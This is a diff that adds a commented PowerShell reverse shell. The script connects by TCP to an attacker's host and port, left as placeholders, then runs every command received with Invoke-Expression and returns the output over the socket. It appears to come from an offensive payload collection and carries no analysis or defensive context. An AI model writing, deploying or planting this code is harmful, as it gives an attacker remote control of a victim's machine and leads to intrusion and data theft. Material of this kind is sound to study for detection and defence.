@@ -1,0 +1,38 @@
+# Create a new TCP client connected to the attacker
+$TCPClient = New-Object Net.Sockets.TCPClient("*\host*", *\port*)
+
+# Get the network stream for reading/writing over the TCP connection
+$NetworkStream = $TCPClient.GetStream()
+
+# Set up stream reader and writer for text-based communication
+$StreamReader = New-Object IO.StreamReader($NetworkStream)
+$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+$StreamWriter.AutoFlush = $true  # Automatically flush after each write
+
+# Buffer for reading incoming data
+$Buffer = New-Object System.Byte[] 1024
+
+# Main loop while the client stays connected
+while ($TCPClient.Connected) {
+    # If data is available to read from the stream
+    while ($NetworkStream.DataAvailable) {
+        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
+
+        # Convert bytes to UTF-8 string (one less than the number of bytes read to strip newline)
+        $Code = ([Text.Encoding]::UTF8).GetString($Buffer, 0, $RawData - 1)
+    }
+
+    # If we got a non-empty command, execute it
+    if ($TCPClient.Connected -and $Code.Length -gt 1) {
+        # Run the received command and catch any errors
+        $Output = try { Invoke-Expression $Code 2>&1 } catch { $_ }
+
+        $StreamWriter.Write("$Output`n")
+        $Code = $null
+    }
+}
+
+$TCPClient.Close()
+$NetworkStream.Close()
+$StreamReader.Close()
+$StreamWriter.Close()
